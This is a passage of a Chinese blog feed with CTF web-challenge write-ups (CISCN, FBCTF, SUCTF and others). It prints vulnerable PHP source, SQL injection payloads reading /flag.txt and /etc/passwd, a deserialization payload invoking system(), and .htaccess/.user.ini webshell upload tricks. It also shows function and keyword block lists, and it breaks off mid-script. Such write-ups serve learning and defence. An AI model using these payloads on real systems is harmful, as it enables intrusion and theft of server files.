href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>这道题真坑啊，进页面是几个输入框，各种提交，查询，修改，删除的功能，然后我在查询那里试了半天，试出一个异或注入，爆出数据库名后，没想到查表得时候发现select什么的都给ban了，也没法绕过，结果没办法，只能找其他方法了。</p><p>在主页有一个文件包含，用伪协议读取到所有文件的源码，源码就不一一放出来了，看两个比较重要的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;confirm.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">&#x2F;&#x2F;var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re &#x3D; $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从上面可以看到，对传入的<code>user_name</code>和<code>phone</code>进行了严格的过滤，但是对```address``却没有做过滤，再看看另一个文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;change.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里对刚刚传入的address参数没有做任何处理就放进了数据表中，那么我们只要在原始传入带有sql注入的address参数，然后在这个页面发起请求，那个sql语句就会被触发，然后就可以成功执行sql注入。<br>思路有了以后，构造payload,这里用的是报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>直接读取显示不全，分两段读取payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>然后就得到flag了。</p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;CISCN2019-总决赛-Day2-Web1-Easyweb&quot;&gt;&lt;a href=&quot;#CISCN2019-总决赛-Day2-Web1-Easyweb&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 总决赛 Day2 Web1]Easyweb&quot;&gt;&lt;/a&gt;[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;考点：盲注，文件上传&lt;br&gt;查看robots.txt：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>buuoj 刷题记录（一）</title>
    <link href="http://yoursite.com/2020/07/13/buuoj_01/"/>
    <id>http://yoursite.com/2020/07/13/buuoj_01/</id>
    <published>2020-07-13T12:30:32.000Z</published>
    <updated>2020-08-01T01:44:27.806Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><a id="more"></a><p>抓包</p><p><img src="/images/20200723201821.png" alt=""></p><p>date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数<br>使用 <code>func=readfile&amp;p=index.php</code> 读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,</span><br><span class="line">  &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,</span><br><span class="line">  &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,</span><br><span class="line">  &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,</span><br><span class="line">  &quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,</span><br><span class="line">  &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">  &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,</span><br><span class="line">  &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,</span><br><span class="line">  &quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result &#x3D; call_user_func($func, $p);</span><br><span class="line">    $a&#x3D; gettype($result);</span><br><span class="line">    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用了很多函数，看到有 <strong>__destruct()</strong> 函数，尝试构造反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;p &#x3D; &#39;find &#x2F; -name flag*&#39;;</span><br><span class="line">$a-&gt;p &#x3D; &#39;cat &#x2F;tmp&#x2F;flagoefiu4r93&#39;;</span><br><span class="line"></span><br><span class="line">$a-&gt;func &#x3D; &#39;system&#39;;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><p>寻找flag文件<br><img src="/images/20200724003619.png" alt=""></p><p>读取flag<br><img src="/images/20200724003709.png" alt=""></p><h2 id="MRCTF2020-你传你ma呢"><a href="#MRCTF2020-你传你ma呢" class="headerlink" title="[MRCTF2020]你传你ma呢"></a>[MRCTF2020]你传你ma呢</h2><p>利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马</p><p>增加使用php解析的文件后缀(.jpg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p><img src="/images/20200724003759.png" alt=""></p><p>然后再写个一句话，连上蚁剑即可</p><p><img src="/images/20200724003852.png" alt=""></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>绕过后缀名检验：<code>php、php3、php5、php7、pht、phtml</code><br>文件头加入 <code>GIF89a</code><br>修改 <code>Content-Type: image/jpeg</code><br>可解析为php的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">&lt;?&#x3D; phpinfo(); ?&gt;</span><br><span class="line">&lt;script language&#x3D;php&gt;phpinfo();&lt;&#x2F;script&gt;    &#x2F;&#x2F;php7移除</span><br><span class="line">&lt;? phpinfo(); ?&gt;    &#x2F;&#x2F;需要php.ini中short_open_tag&#x3D;On</span><br><span class="line">&lt;% phpinfo(); %&gt;    &#x2F;&#x2F;需要php.ini中asp_tags &#x3D; On  php7移除</span><br></pre></td></tr></table></figure><p>php版本是5.5.9，用第三个<br>上传之后连接蚁剑即可</p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;cmd&#39;])) &#123;</span><br><span class="line">  $json &#x3D; $_REQUEST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];</span><br><span class="line">    if ($cmd !&#x3D;&#x3D; NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#39;Invalid input&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>正则表达式修饰符s匹配多行，这里直接用<code>%0A</code>换行符绕过正则payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><blockquote><p>考点：文件上传</p></blockquote><p>利用<strong>.user.ini</strong>构造php后门，<strong>.user.ini</strong>的使用前提是目录中必须有至少一个php文件，<strong>.user.ini</strong>有两个配置参数：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong>。<br>auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure><p>01.gif是要包含的文件。<br>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br><img src="/images/20200724003955.png" alt=""></p><blockquote><p>参考链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>没什么好说的，apache服务器上传<strong>.htaccess</strong>文件</p><h2 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h2><p>毫无意义的一道题，浪费了十几分钟的时间。</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>查看源码有<code>flag.php</code>，访问然后修改<code>X-Forwarded-For: 127.0.0.1</code>可得flag</p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><blockquote><p>二次注入，git泄露</p></blockquote><p>爆破得到账号密码，登陆<br>然后是git泄露，先下载源码然后修复，得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用<br>第一次输入category和第二次输入content可以拼接，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">    content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">    bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>然后再放两个payload，读取flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h2><p>这个没什么好说的，直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">elements &#x3D; (&#39;H&#39;, &#39;He&#39;, &#39;Li&#39;, &#39;Be&#39;, &#39;B&#39;, &#39;C&#39;, &#39;N&#39;, &#39;O&#39;, &#39;F&#39;, &#39;Ne&#39;, &#39;Na&#39;, &#39;Mg&#39;, &#39;Al&#39;, &#39;Si&#39;, &#39;P&#39;, &#39;S&#39;, &#39;Cl&#39;, &#39;Ar&#39;,</span><br><span class="line">                  &#39;K&#39;, &#39;Ca&#39;, &#39;Sc&#39;, &#39;Ti&#39;, &#39;V&#39;, &#39;Cr&#39;, &#39;Mn&#39;, &#39;Fe&#39;, &#39;Co&#39;, &#39;Ni&#39;, &#39;Cu&#39;, &#39;Zn&#39;, &#39;Ga&#39;, &#39;Ge&#39;, &#39;As&#39;, &#39;Se&#39;, &#39;Br&#39;, </span><br><span class="line">                  &#39;Kr&#39;, &#39;Rb&#39;, &#39;Sr&#39;, &#39;Y&#39;, &#39;Zr&#39;, &#39;Nb&#39;, &#39;Mo&#39;, &#39;Te&#39;, &#39;Ru&#39;, &#39;Rh&#39;, &#39;Pd&#39;, &#39;Ag&#39;, &#39;Cd&#39;, &#39;In&#39;, &#39;Sn&#39;, &#39;Sb&#39;, &#39;Te&#39;, </span><br><span class="line">                  &#39;I&#39;, &#39;Xe&#39;, &#39;Cs&#39;, &#39;Ba&#39;, &#39;La&#39;, &#39;Ce&#39;, &#39;Pr&#39;, &#39;Nd&#39;, &#39;Pm&#39;, &#39;Sm&#39;, &#39;Eu&#39;, &#39;Gd&#39;, &#39;Tb&#39;, &#39;Dy&#39;, &#39;Ho&#39;, &#39;Er&#39;, &#39;Tm&#39;, </span><br><span class="line">                  &#39;Yb&#39;, &#39;Lu&#39;, &#39;Hf&#39;, &#39;Ta&#39;, &#39;W&#39;, &#39;Re&#39;, &#39;Os&#39;, &#39;Ir&#39;, &#39;Pt&#39;, &#39;Au&#39;, &#39;Hg&#39;, &#39;Tl&#39;, &#39;Pb&#39;, &#39;Bi&#39;, 